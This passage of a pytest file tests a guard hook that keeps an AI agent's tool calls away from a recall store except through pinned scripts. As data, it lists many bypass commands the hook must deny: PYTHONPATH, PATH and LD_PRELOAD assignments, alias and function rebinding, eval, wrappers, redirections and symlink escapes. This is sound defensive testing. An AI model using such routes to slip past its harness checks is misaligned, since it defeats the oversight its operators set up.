    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


def _not_exempt_calls(world: _StoreWorld) -> dict[str, str]:
    recall = _PINNED_RECALL.as_posix()
    elsewhere = world.tmp / "x" / "scripts" / "mem_observation.py"
    elsewhere.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(_PINNED_OBSERVATION, elsewhere)
    (world.cwd / "mem_recall.py").write_text("print('not the pinned script')\n", encoding="utf-8")
    payload = f"open('{world.s}/runs/x.jsonl').read()"
    evil = (world.tmp / "evil").as_posix()
    return {
        # CSR-UNIT-013: the path is pinned, not the basename.
        "same-name-elsewhere": f"uv run {elsewhere.as_posix()} write --store {world.s}",
        "dot-slash-from-another-cwd": f"uv run ./mem_recall.py filter --store {world.s}",
        "dotdot-escape": (
            f"uv run {SCRIPTS.as_posix()}/../../evil/scripts/mem_observation.py "
            f"write --store {world.s}"
        ),
        "python-dash-c": f'python -c "{payload}" {recall} filter',
        "uv-run-python-dash-c": f'uv run python -c "{payload}" {recall} filter',
        # C-7 and C-8 as chosen here: the script right after `uv run` or a bare python.
        "option-before-script": f"uv run --with x {recall} filter --store {world.s}",
        "uv-run-python": f"uv run python {recall} filter --store {world.s}",
        "interpreter-by-path": f"/usr/bin/python3 {recall} filter --store {world.s}",
        "py-launcher": f"py {recall} filter --store {world.s}",
        # An assignment that swaps the interpreter or its modules.
        "pythonpath-assignment": f"PYTHONPATH={evil} uv run {recall} filter --store {world.s}",
        "path-assignment": f"PATH={evil}:$PATH python {recall} filter --store {world.s}",
        "uv-assignment": f"UV_PYTHON={evil}/python uv run {recall} filter --store {world.s}",
        # The same, glued to a group opener (bmad review 6).
        "glued-paren-assignment": f"(PYTHONPATH={evil} uv run {recall} filter --store {world.s})",
        # An assignment that moves the home folder, the configuration uv, git
        # or Python read, or the environment the call runs in (bypass review 1).
        "home-assignment": f"HOME={evil} python3 {recall} filter --store {world.s}",
        "userprofile-assignment": f"USERPROFILE={evil} uv run {recall} filter --store {world.s}",
        "appdata-assignment": f"APPDATA={evil} uv run {recall} filter --store {world.s}",
        "xdg-assignment": f"XDG_CONFIG_HOME={evil} uv run {recall} filter --store {world.s}",
        "git-config-assignment": f"GIT_CONFIG_COUNT=1 uv run {recall} filter --store {world.s}",
        "conda-assignment": f"CONDA_PREFIX={evil} uv run {recall} filter --store {world.s}",
        "virtual-env-assignment": f"VIRTUAL_ENV={evil} uv run {recall} filter --store {world.s}",
        "ld-preload-assignment": f"LD_PRELOAD={evil}/x.so uv run {recall} filter --store {world.s}",
    }


_NOT_EXEMPT_CALLS = (
    "same-name-elsewhere",
    "dot-slash-from-another-cwd",
    "dotdot-escape",
    "python-dash-c",
    "uv-run-python-dash-c",
    "option-before-script",
    "uv-run-python",
    "interpreter-by-path",
    "py-launcher",
    "pythonpath-assignment",
    "path-assignment",
    "uv-assignment",
    "glued-paren-assignment",
    "home-assignment",
    "userprofile-assignment",
    "appdata-assignment",
    "xdg-assignment",
    "git-config-assignment",
    "conda-assignment",
    "virtual-env-assignment",
    "ld-preload-assignment",
)


@pytest.mark.parametrize("name", _NOT_EXEMPT_CALLS)
def test_csr_lookalike_recall_calls_are_not_exempt(store_world: _StoreWorld, name: str) -> None:
    """CSR-UNIT-013 (AC-23) and the exemption shape chosen for C-7 and C-8:
    each names the store and is not the pinned call, so it is denied."""
    code, out = _bash(store_world, _not_exempt_calls(store_world)[name])
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_relative_pinned_path_after_a_cd_is_not_exempt(store_world: _StoreWorld) -> None:
    """A `cd` earlier in the command moves where a relative script path lands
    when it runs, so the relative operand stops counting as pinned."""
    evil = store_world.tmp / "evil"
    command = f"cd {evil.as_posix()} && uv run scripts/mem_recall.py {_filter_args(store_world)}"

    code, out = _bash(store_world, command, cwd=SCRIPTS.parent)

    _assert_latch_denied(code, out, store_world.latch)


_REDIRECT_OPS = (">", ">>", "<", "2>", "&>", "1>", ">|", "&>>", "<<<")


@pytest.mark.parametrize("form", ["spaced-into-store", "glued-into-store", "spaced-elsewhere", "glued-elsewhere"])
@pytest.mark.parametrize("op", _REDIRECT_OPS)
def test_csr_redirection_refuses_the_exemption(store_world: _StoreWorld, op: str, form: str) -> None:
    """CSR-UNIT-014 (AC-23): a redirection in an otherwise exempt segment."""
    target = f"{store_world.s}/evil" if form.endswith("into-store") else (store_world.tmp / "elsewhere").as_posix()
    gap = " " if form.startswith("spaced") else ""
    command = f"{_exempt_filter(store_world)} {op}{gap}{target}"

    code, out = _bash(store_world, command)

    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "tail",
    [" >&2", ">&2", ">{s}/evil"],
    ids=["dup-to-stderr-spaced", "dup-to-stderr-glued", "glued-to-the-store-value"],
)
def test_csr_fd_and_glued_redirection_refuse_the_exemption(store_world: _StoreWorld, tail: str) -> None:
    """CSR-UNIT-014: the fd form and a redirection glued to the --store value."""
    code, out = _bash(store_world, _exempt_filter(store_world) + tail.format(s=store_world.s))
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "substitution",
    ["--epic $(cat {t}/epic)", "--epic `cat {t}/epic`", "--deferred <(cat {t}/d)", "--deferred >(tee {t}/d)"],
    ids=["dollar-paren", "backticks", "process-in", "process-out"],
)
def test_csr_command_substitution_refuses_the_exemption(
    store_world: _StoreWorld, substitution: str
) -> None:
    """CSR-UNIT-015 (AC-12, AC-23)."""
    arg = substitution.format(t=store_world.tmp.as_posix())
    command = f"uv run {_PINNED_OBSERVATION.as_posix()} {_write_args(store_world)} {arg}"
    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "wrapper",
    ["env {c}", "env FOO=1 {c}", "sudo {c}", 'bash -c "{c}"', "sh -c '{c}'", "time {c}", "nohup {c}", "exec {c}"],
    ids=["env", "env-assignment", "sudo", "bash-c", "sh-c", "time", "nohup", "exec"],
)
def test_csr_wrapped_recall_calls_are_not_exempt(store_world: _StoreWorld, wrapper: str) -> None:
    """CSR-UNIT-025 (AC-23): only `uv run` or a python may lead an exempt segment."""
    code, out = _bash(store_world, wrapper.format(c=_exempt_filter(store_world)))
    _assert_latch_denied(code, out, store_world.latch)


@_WINDOWS_ONLY
def test_csr_windows_pinned_script_spellings(store_world: _StoreWorld) -> None:
    """CSR-UNIT-046 (AC-12, AC-23), Windows only.

    Allowed: the pinned path with forward slashes, as a double-quoted backslash
    path, and with its drive letter in the other case. Denied, the documented
    residual: an unquoted backslash path, which POSIX shlex mangles (as Git
    Bash does when it runs it), so the script is not recognised and the call
    fails closed (recall off), never open.
    """
    posix = _PINNED_RECALL.as_posix()
    filt = f"filter --store {store_world.s}"
    for command in (
        f"uv run {posix} {filt}",
        f'uv run "{_PINNED_RECALL}" filter --store "{store_world.store}"',
        f"uv run {posix[0].swapcase()}{posix[1:]} {filt}",
    ):
        _assert_allowed(*_bash(store_world, command))

    code, out = _bash(store_world, f"uv run {_PINNED_RECALL} filter --store {store_world.store}")
    _assert_latch_denied(code, out, store_world.latch)


# --- The relocated mutant twins (CSR-UNIT-026) ---------------------------------

_BASENAME_EXEMPTION = (
    "    return _is_pinned(absolute)",
    "    return os.path.basename(operand) in _RECALL_SCRIPTS",
)
_WHOLE_COMMAND_EXEMPTION = (
    "and _exempt_segment(segment, cwd, command)",
    "and _exempt_segment(command, cwd, command)",
)


def _write_relocated_guard(tmp_path: Path, edit: tuple[str, str] | None) -> tuple[Path, Path]:
    """A copy of the hook at tmp_path/skill/scripts/hooks/, beside copies of both
    pinned scripts, so its skill root (its own location) is tmp_path/skill.
    `edit` is one textual mutation, or None for the unmutated copy."""
    src = _hook_source()
    if edit is not None:
        old, new = edit
        assert old in src, f"mutation anchor drifted out of the hook: {old!r}"
        src = src.replace(old, new, 1)
    scripts = tmp_path / "skill" / "scripts"
    (scripts / "hooks").mkdir(parents=True)
    hook = scripts / "hooks" / "guard_pretooluse.py"
    hook.write_text(src, encoding="utf-8")
    for script in (_PINNED_RECALL, _PINNED_OBSERVATION):
        shutil.copyfile(script, scripts / script.name)
    return hook, scripts


def _relocated_control(world: _StoreWorld, scripts: Path) -> str:
    return f"uv run {(scripts / 'mem_observation.py').as_posix()} {_write_args(world)}"


def _same_name_elsewhere(world: _StoreWorld) -> str:
    return _not_exempt_calls(world)["same-name-elsewhere"]


def _compound(world: _StoreWorld, scripts: Path) -> str:
    return f"{_relocated_control(world, scripts)} && cat {world.s}/runs/x.jsonl"


def test_csr_relocated_guard_pins_its_own_scripts(store_world: _StoreWorld, tmp_path: Path) -> None:
    """Baseline for the twins: relocation alone allows the control and still
    denies both bypasses, so what the twins let through is their mutation."""
    hook, scripts = _write_relocated_guard(tmp_path, None)

    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))
    for command in (_same_name_elsewhere(store_world), _compound(store_world, scripts)):
        code, out = _bash(store_world, command, hook=hook)
        _assert_latch_denied(code, out, store_world.latch)
    # The shipped scripts lie outside the copy's skill root: not exempt there.
    code, out = _bash(store_world, f"uv run {_PINNED_OBSERVATION.as_posix()} {_write_args(store_world)}", hook=hook)
    _assert_latch_denied(code, out, store_world.latch)


def test_mutant_basename_exemption_allows_a_same_named_script(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """CSR-UNIT-026 twin: an exemption matched by basename lets the same-named
    script through, so the CSR-UNIT-013 deny reds against it; the control
    still passes, so it is the pinning, not a deny-all, that the deny rests on."""
    hook, scripts = _write_relocated_guard(tmp_path, _BASENAME_EXEMPTION)

    _assert_allowed(*_bash(store_world, _same_name_elsewhere(store_world), hook=hook))
    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))


def test_mutant_whole_command_exemption_allows_a_compound(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """CSR-UNIT-026 twin: an exemption checked on the whole command lets the
    compound through, so the CSR-UNIT-012 deny reds against it; the control
    still passes."""
    hook, scripts = _write_relocated_guard(tmp_path, _WHOLE_COMMAND_EXEMPTION)

    _assert_allowed(*_bash(store_world, _compound(store_world, scripts), hook=hook))
    _assert_allowed(*_bash(store_world, _relocated_control(store_world, scripts), hook=hook))


def test_csr_an_unforeseen_error_under_a_latch_fails_closed(store_world: _StoreWorld, tmp_path: Path) -> None:
    """Item 6 of this PR's scope: a crash inside the latch gate denies rather
    than exiting non-zero (no decision, so the call would run)."""
    mutant = _write_mutant(
        tmp_path, "home_dirs_raises", "    homes: list[str] = []\n", '    raise RuntimeError("boom")\n'
    )
    _assert_allowed(*_bash(store_world, "ls"))

    code, out = _bash(store_world, "ls", hook=mutant)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "could not evaluate this Bash call against the run latch (RuntimeError)" in reason
    store_world.latch.unlink()
    _assert_allowed(*_bash(store_world, "ls", hook=mutant))


# --- Unset store, latches with no store, the git gates -------------------------

_UNSET_STORES = {
    "empty": "",
    "blank": "   ",
    "unresolved-token": "{workflow.cross_session_recall_store}",
    "dollar-var": "$VAR",
    "null": None,
    "missing": "<missing>",
}


@pytest.mark.parametrize("recall", ["off", "on-red"])
@pytest.mark.parametrize("store", sorted(_UNSET_STORES))
def test_csr_unset_store_denies_nothing_by_path(store_world: _StoreWorld, store: str, recall: str) -> None:
    """CSR-UNIT-045 (AC-12, AC-11): the shipped default (`""`, recall off) and
    the other unset forms name no store, so ordinary work is untouched while
    claude-mem is still denied. Resolving `""` against the cwd would deny every
    file and Bash call in every default run."""
    state = _v2_latch(None, recall="off" if recall == "off" else "on", store_ok=False)
    value = _UNSET_STORES[store]
    if value == "<missing>":
        del state["store"]
    else:
        state["store"] = value
    _write_state(store_world.impl, state)
    src = (store_world.cwd / "src" / "x.py").as_posix()

    for tool, tool_input in (
        ("Read", {"file_path": src}),
        ("Write", {"file_path": src, "content": "x"}),
        ("Edit", {"file_path": src, "old_string": "a", "new_string": "b"}),
        ("Glob", {"pattern": "**/*.py", "path": store_world.cwd.as_posix()}),
        ("Bash", {"command": "ls"}),
    ):
        _assert_allowed(*_run_in(store_world, tool, tool_input))
    code, out = _run_in(store_world, "mcp__claude_mem__search", {})
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize(
    "latch",
    ["v1-green-by-old-rules", "v1-red", "zero-byte", "malformed-json", "non-object", "latch-version-3"],
)
def test_csr_latch_with_no_usable_store_skips_the_store_rule(store_world: _StoreWorld, latch: str) -> None:
    """CSR-UNIT-036 under the maintainer's C-2 default: a v1 latch or one that
    does not read as v2 has no store to match, so nothing is denied by path,
    while every claude-mem call is still denied."""
    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))
    run_file = f"{store_world.s}/runs/x.jsonl"

    _assert_allowed(*_run_in(store_world, "Read", {"file_path": run_file}))
    _assert_allowed(*_bash(store_world, f"cat {run_file}"))
    code, out = _run_in(store_world, "mcp__plugin_claude-mem_mcp-search__search", {})
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_v2_latch_leaves_the_git_gates_and_other_bash_alone(tmp_path: Path) -> None:
    """CSR-UNIT-037 (AC-11): the memory gate never short-circuits the git gates."""
    repo = _protected_repo(tmp_path)
    impl = tmp_path / "impl"
    home = tmp_path / "home"
    _write_state(impl, _v2_latch(home / ".ultracode-goal" / "recall"))
    env = {"ULTRACODE_IMPL_ARTIFACTS": str(impl), "HOME": str(home), "USERPROFILE": str(home)}

    code, out = _run_hook(_commit_event(repo), repo, env)
    assert code == 2
    assert "Protected-branch" in _reason(out)

    _assert_allowed(*_run_hook(_bash_event(repo, "ls -la"), repo, env))


# --- Guard item 5: self-contained, and reading the latch like mem_common -------


def test_csr_guard_imports_only_the_standard_library() -> None:
    """CSR-UNIT-035 (AC-24): no lib/ or mem_common import, no relative import."""
    tree = ast.parse(_hook_source())
    names: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            assert node.level == 0, "relative import in the guard"
            names.add((node.module or "").split(".")[0])
    assert names, "the scan found no import at all"
    assert names <= set(sys.stdlib_module_names), names - set(sys.stdlib_module_names)
    assert not names & {"lib", "mem_common"}


@pytest.fixture
def mem_common():
    """lib/mem_common.py imported in-process from its file, fresh per test."""
    spec = importlib.util.spec_from_file_location("ucg_mem_common_under_test", _MEM_COMMON)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _parity_corpus(tmp_path: Path) -> dict[str, object]:
    """One latch file per shape: dict and list as JSON, str as text, bytes raw."""
    store = tmp_path / "abs" / "recall"
    without_store = _v2_latch(store)
    del without_store["store"]
    return {
        "v1-green-by-old-rules": _GREEN_STATE,
        "v1-red": {**_GREEN_STATE, "recall": "off"},
        "v2-green": _v2_latch(store),
        "v2-red": _v2_latch(store, store_ok=False),
        "v2-recall-off": _v2_latch(store, recall="off"),
        "v2-other-backend": _v2_latch(store, backend="claude-mem"),
        "v2-store-ok-string": _v2_latch(store, store_ok="true"),
        "v2-without-store": without_store,
        "v2-store-null": _v2_latch(None),
        "v2-store-empty": _v2_latch(""),
        "v2-store-blank": _v2_latch("   "),
        "v2-store-token": _v2_latch("{workflow.cross_session_recall_store}"),
        "v2-store-dollar-var": _v2_latch("$VAR"),
        "v2-store-relative": _v2_latch("recall"),
        "v2-store-nul": _v2_latch("/abs/re\0call"),
        "v2-store-number": {**_v2_latch(store), "store": 7},
        "v2-store-tilde": _v2_latch("~/.ultracode-goal/recall"),
        "v2-store-dollar-in-name": _v2_latch(tmp_path / "my$proj" / ".recall"),
        "v2-store-trailing-separator": _v2_latch(str(store) + os.sep),
        "v2-store-dot-dot": _v2_latch(os.path.join(str(store.parent), "x", "..", "recall")),
        "version-3": _v2_latch(store, latch_version=3),
        "version-bool": _v2_latch(store, latch_version=True),
        "version-string": _v2_latch(store, latch_version="2"),
        "version-float": _v2_latch(store, latch_version=2.0),
        "zero-byte": "",
        "whitespace-only": "  \n\t",
        "malformed": "{not: valid json,,,",
        "non-object-list": [1, 2],
        "json-string": '"latch"',
        "json-null": "null",
        "utf8-bom": "﻿" + json.dumps(_v2_latch(store)),
        "invalid-utf8": (
            b'{"latch_version": 2, "backend": "jsonl", "store_ok": true, '
            b'"recall": "on", "store": "\xff/recall"}'
        ),
        # json.loads raises RecursionError on these: both readers read None.
        "deep-array": "[" * 100000 + "]" * 100000,
        "deep-object": '{"a":' * 50000 + "1" + "}" * 50000,
    }


_PARITY_NAMES = sorted(_parity_corpus(Path("/corpus-names")))


def _write_latch_payload(impl: Path, payload: object) -> Path:
    impl.mkdir(parents=True, exist_ok=True)
    path = impl / ".mem-state.json"
    if isinstance(payload, bytes):
        path.write_bytes(payload)
    elif isinstance(payload, str):
        path.write_text(payload, encoding="utf-8")
    else:
        path.write_text(json.dumps(payload), encoding="utf-8")
    return path


@pytest.mark.parametrize("name", _PARITY_NAMES)
def test_csr_guard_reads_a_latch_like_mem_common(
    guard_module, mem_common, tmp_path: Path, monkeypatch, name: str
) -> None:
    """CSR-UNIT-016 (AC-24, AC-16): one latch file, two readers, one answer:
    version, colour and the resolved absolute store path."""
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    impl = tmp_path / "impl"
    path = _write_latch_payload(impl, _parity_corpus(tmp_path)[name])

    ours = guard_module._latch_view(guard_module._read_latch(path))
    theirs = mem_common.latch_view(mem_common.read_state(impl))

    assert ours == theirs


def test_csr_parity_corpus_reads_as_the_spec_says(guard_module, tmp_path: Path, monkeypatch) -> None:
    """Anchors for the parity row, so the two readers cannot agree on a wrong
    answer: a v1 latch is red with no store (AC-16), a green v2 latch carries
    its resolved store, `~` resolves against the home, a missing latch reads as
    nothing."""
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    corpus = _parity_corpus(tmp_path)
    store = str(tmp_path / "abs" / "recall")

    def view(name: str) -> tuple:
        path = _write_latch_payload(tmp_path / name, corpus[name])
        got = guard_module._latch_view(guard_module._read_latch(path))
        return got["latch_version"], got["store_ok"], got["store"]

    assert view("v1-green-by-old-rules") == (1, False, None)
    assert view("v2-green") == (2, True, store)
    assert view("v2-red") == (2, False, store)
    assert view("v2-recall-off") == (2, False, store)
    assert view("v2-store-tilde") == (2, True, str(home / ".ultracode-goal" / "recall"))
    assert view("v2-store-trailing-separator") == (2, True, store)
    assert view("v2-store-dot-dot") == (2, True, store)
    assert view("v2-store-empty") == (2, False, None)
    assert view("version-3") == (3, False, None)
    assert view("zero-byte") == (None, False, None)
    assert guard_module._read_latch(tmp_path / "nowhere" / ".mem-state.json") is None


@_NEEDS_GIT
def test_csr_guard_denies_the_run_file_a_real_latch_and_write_produced(tmp_path: Path) -> None:
    """CSR-INT-037 (AC-24, AC-12, AC-23): end to end. The real `latch` and the
    real `write` land a run file under ~/.ultracode-goal/recall; under the latch
    `latch` wrote, the real guard denies a Read and a Bash `cat` of that exact
    file, and lets the pinned reader through."""
    home = tmp_path / "home"
    home.mkdir()
    repo = tmp_path / "widget"
    repo.mkdir()
    _init_repo(repo, "ultracode/epic-7")
    impl = tmp_path / "impl"
    store_value = "~/.ultracode-goal/recall"
    env = {**os.environ, "HOME": str(home), "USERPROFILE": str(home)}

    def script(path: Path, *args: str) -> None:
        proc = subprocess.run(
            [sys.executable, str(path), *args],
            capture_output=True, text=True, encoding="utf-8", env=env,
        )
        assert proc.returncode == 0, proc.stdout + proc.stderr

    script(
        _PINNED_RECALL, "latch", "--impl-artifacts", str(impl), "--run-id", _RUN,
        "--recall", "on", "--store", store_value, "--cwd", str(repo),
    )
    script(
        _PINNED_OBSERVATION, "write", "--impl-artifacts", str(impl), "--store", store_value,
        "--epic", "7", "--run-id", _RUN, "--gate-status", "PASS", "--verdict", "advance",
        "--cwd", str(repo), "--valid-until-date", "2026-06-04",
    )
    runs = sorted((home / ".ultracode-goal" / "recall").glob("*/runs/*.jsonl"))
    assert [p.name for p in runs] == [f"{_RUN}.jsonl"]
    run_file = runs[0]
    latch = impl / ".mem-state.json"
    hook_env = {"HOME": str(home), "USERPROFILE": str(home), "ULTRACODE_IMPL_ARTIFACTS": str(impl)}

    for tool, tool_input in (
        ("Read", {"file_path": str(run_file)}),
        ("Bash", {"command": f"cat {run_file.as_posix()}"}),
    ):
        code, out = _run_hook(_mem_event(tool, repo, tool_input), repo, hook_env)
        _assert_latch_denied(code, out, latch)

    reader = (
        f"uv run {_PINNED_RECALL.as_posix()} filter --impl-artifacts {impl.as_posix()} "
        f"--store {store_value} --cwd {repo.as_posix()}"
    )
    _assert_allowed(*_run_hook(_bash_event(repo, reader), repo, hook_env))


# --- Review rows: each was allowed by the guard as first built ------------------
# Every deny row below was reproduced against the first build of this change
# (allowed there) before it was closed. Unless a row says otherwise, it runs
# under the green v2 `store_world` latch.


def _symlink_or_skip(link: Path, target: Path) -> None:
    try:
        os.symlink(target, link, target_is_directory=target.is_dir())
    except (OSError, NotImplementedError) as exc:
        pytest.skip(f"cannot create a symlink here: {exc}")


_V2_COLOURS = ("v2-store-ok", "v2-store-not-ok", "v2-recall-off")


@pytest.mark.parametrize("latch", _V2_COLOURS)
def test_csr_store_rule_follows_the_store_whatever_the_v2_colour(
    store_world: _StoreWorld, latch: str
) -> None:
    """The rule reads the latch's `store`, not its colour: a red latch and the
    default recall-off latch, which still carries the store, deny as well, and
    the pinned call still passes under each (bmad review 1)."""
    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))
    run_file = f"{store_world.s}/runs/x.jsonl"

    for tool, tool_input in (("Read", {"file_path": run_file}), ("Bash", {"command": f"cat {run_file}"})):
        reason = _assert_latch_denied(*_run_in(store_world, tool, tool_input), store_world.latch)
        assert "names the recall store" in reason
    _assert_allowed(*_bash(store_world, _exempt_filter(store_world)))


def test_csr_segment_whose_quoting_does_not_parse_is_read_raw(store_world: _StoreWorld) -> None:
    """The quote-blind split leaves `b' ~/...` behind, which shlex cannot read;
    its raw text still names the store (bmad review 2)."""
    code, out = _bash(store_world, "cat 'a;b' ~/.ultracode-goal/recall/runs/x.jsonl")
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_relative_path_resolves_against_the_event_cwd(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """The event's cwd, not the hook process's own, is the base (bmad review 3)."""
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    parent = store_world.store.parent
    relative = {"file_path": "recall/runs/x.jsonl"}

    code, out = _run_mutant_hook(HOOK, _mem_event("Read", parent, relative), elsewhere, store_world.env)
    _assert_latch_denied(code, out, store_world.latch)
    _assert_allowed(*_run_mutant_hook(HOOK, _mem_event("Read", elsewhere, relative), parent, store_world.env))


def test_csr_symlinked_skill_pins_both_the_link_and_the_real_path(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """C-11: a guard run through a symlinked skill folder admits the pinned
    scripts by the path it runs from and by their resolved path (bmad review 4)."""
    _, scripts = _write_relocated_guard(tmp_path, None)
    linked = tmp_path / "linked-skill"
    _symlink_or_skip(linked, scripts.parent)
    hook = linked / "scripts" / "hooks" / "guard_pretooluse.py"

    for root in (linked / "scripts", scripts):
        command = f"uv run {(root / 'mem_recall.py').as_posix()} {_filter_args(store_world)}"
        _assert_allowed(*_bash(store_world, command, hook=hook))


def test_csr_userprofile_spellings_read_userprofile_when_home_differs(tmp_path: Path) -> None:
    """HOME and USERPROFILE on two folders: a USERPROFILE spelling is read
    against the folder that variable holds (bmad review 5)."""
    home, profile = tmp_path / "home", tmp_path / "profile"
    store = profile / ".ultracode-goal" / "recall"
    store.mkdir(parents=True)
    home.mkdir()
    repo = tmp_path / "repo"
    repo.mkdir()
    impl = tmp_path / "impl"
    _write_state(impl, _v2_latch(store))
    env = {"HOME": str(home), "USERPROFILE": str(profile), "ULTRACODE_IMPL_ARTIFACTS": str(impl)}

    for spelling in ("%USERPROFILE%", "$USERPROFILE", "${USERPROFILE}"):
        command = f"cat {spelling}/.ultracode-goal/recall/runs/x.jsonl"
        code, out = _run_hook(_bash_event(repo, command), repo, env)
        _assert_latch_denied(code, out, impl / ".mem-state.json")


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="Win32 folds `..` before it follows a link, so the lexical path is the one that runs",
)
def test_csr_dotdot_out_of_a_symlinked_folder_is_not_the_pinned_script(
    store_world: _StoreWorld, tmp_path: Path
) -> None:
    """`<scripts>/sub/../mem_recall.py` folds lexically to the pinned path, but
    with `sub` a link elsewhere the shell runs another file (bmad review 7)."""
    hook, scripts = _write_relocated_guard(tmp_path, None)
    evil = tmp_path / "evil" / "x"
    evil.mkdir(parents=True)
    (evil.parent / "mem_recall.py").write_text("print('not the pinned script')\n", encoding="utf-8")
    _symlink_or_skip(scripts / "sub", evil)

    twin = f"uv run {(scripts / 'sub').as_posix()}/../mem_recall.py {_filter_args(store_world)}"
    code, out = _bash(store_world, twin, hook=hook)
    _assert_latch_denied(code, out, store_world.latch)
    pinned = f"uv run {(scripts / 'mem_recall.py').as_posix()} {_filter_args(store_world)}"
    _assert_allowed(*_bash(store_world, pinned, hook=hook))


def test_csr_deny_reason_quotes_a_long_segment_cut_short(store_world: _StoreWorld) -> None:
    """A heredoc is one segment: its reason quotes at most 160 characters of it,
    not the whole body back into the model's context (bmad review 10)."""
    body = "x " * 20000
    segment = f"cat {store_world.s}/runs/x.jsonl {body}"
    code, out = _bash(store_world, segment)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert len(reason) < 2000
    # The first 160 characters, whatever the length of the tmp path (a Windows
    # runner's is long enough that the cut falls inside the store path).
    assert f"segment {segment.strip()[:160] + '...'!r} names the recall store" in reason


def _rebinding_commands(world: _StoreWorld) -> dict[str, str]:
    call = _exempt_filter(world)
    evil = (world.tmp / "evil").as_posix()
    return {
        "export-path": f"export PATH={evil}:$PATH; {call}",
        "bare-path-assignment": f"PATH={evil}:$PATH; {call}",
        "path-append": f"PATH+=:{evil}; {call}",
        "path-element": f"PATH[0]={evil}; {call}",
        "declare-x": f"declare -x PYTHONPATH={evil} && {call}",
        "function-definition": f'uv() {{ cat "$3"; }}; {call}',
        "function-keyword": f'function uv {{ cat "$3"; }}; {call}',
        "hash-p": f"hash -p {evil}/uv uv; {call}",
        "alias": f"shopt -s expand_aliases; alias uv={evil}/uv; {call}",
        "dot-source": f". {evil}/env.sh && {call}",
        "source": f"source {evil}/env.sh && {call}",
        "eval": f"eval 'uv() {{ :; }}'; {call}",
        "enable": f"enable -f {evil}/uv.so uv; {call}",
        "unset-path": f"unset PATH; {call}",
        "for-loop-variable": f"for PATH in {evil}; do {call}; done",
        "read": f"read -r PATH <<< {evil}; {call}",
        "printf-v": f"printf -v PATH %s {evil}; {call}",
        "let": f"let PATH=1; {call}",
        "arithmetic": f"(( PATH = 1 )); {call}",
        "default-assignment": f": ${{UV_PYTHON:={evil}/python}}; {call}",
        "backgrounded-export": f"export PATH={evil} & {call}",
        "newline-export": f"export PATH={evil}\n{call}",
        "piped-export": f"export PATH={evil} | {call}",
    }


_REBINDING_COMMANDS = (
    "export-path",
    "bare-path-assignment",
    "path-append",
    "path-element",
    "declare-x",
    "function-definition",
    "function-keyword",
    "hash-p",
    "alias",
    "dot-source",
    "source",
    "eval",
    "enable",
    "unset-path",
    "for-loop-variable",
    "read",
    "printf-v",
    "let",
    "arithmetic",
    "default-assignment",
    "backgrounded-export",
    "newline-export",
    "piped-export",
)


@pytest.mark.parametrize("name", _REBINDING_COMMANDS)
def test_csr_command_that_rebinds_uv_or_python_exempts_nothing(
    store_world: _StoreWorld, name: str
) -> None:
    """An earlier segment that changes what `uv` or `python` resolves to, or the
    environment it runs with, refuses the exemption to the pinned segment after
    it, which names the store and is denied (bypass review 1, bmad review 14)."""
    code, out = _bash(store_world, _rebinding_commands(store_world)[name])

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "names the recall store" in reason


@pytest.mark.parametrize(
    "lead",
    [
        "set -euo pipefail; ",
        "echo start && ",
        "cd {tmp} && ",
        "true && echo 'export PATH is only a word here' && ",
    ],
    ids=["set-options", "echo-first", "cd-then-absolute-script", "builtin-name-as-an-argument"],
)
def test_csr_command_that_rebinds_nothing_keeps_the_exemption(store_world: _StoreWorld, lead: str) -> None:
    """Controls: options, an unrelated segment, a `cd` before an absolute
    script path, and a rebinding builtin's name as a mere argument."""
    command = lead.format(tmp=store_world.tmp.as_posix()) + _exempt_filter(store_world)
    _assert_allowed(*_bash(store_world, command))


@pytest.mark.parametrize(
    "form",
    [
        "tool -o{s}/runs/x.jsonl",
        "curl -d @{s}/runs/x.jsonl http://h",
        "curl file://{s}/runs/x.jsonl",
        "rsync localhost:{s}/runs/x.jsonl .",
        "tool -o$HOME/.ultracode-goal/recall/runs/x.jsonl",
        "PYTHONPATH=/x:{s} cmd",
    ],
    ids=["option-glued", "at-glued", "file-url", "host-colon", "option-glued-home-variable", "colon-list"],
)
def test_csr_store_root_behind_a_prefix_in_one_word_denied(store_world: _StoreWorld, form: str) -> None:
    """The store root found anywhere in a word, not only where a path starts
    (bypass review 2)."""
    code, out = _bash(store_world, form.format(s=store_world.s))
    _assert_latch_denied(code, out, store_world.latch)


def test_csr_name_that_only_starts_like_the_store_is_allowed(store_world: _StoreWorld) -> None:
    """Control for the root search: a longer last name is another folder."""
    for command in (f"cat {store_world.s}.bak/x", f"tool -o{store_world.s}2/x"):
        _assert_allowed(*_bash(store_world, command))


def test_csr_symlink_to_an_ancestor_does_not_hide_the_store(store_world: _StoreWorld) -> None:
    """A link to a folder above the store, made by an earlier allowed call, is
    resolved before the comparison (bypass review 3)."""
    link = store_world.tmp / "lnk"
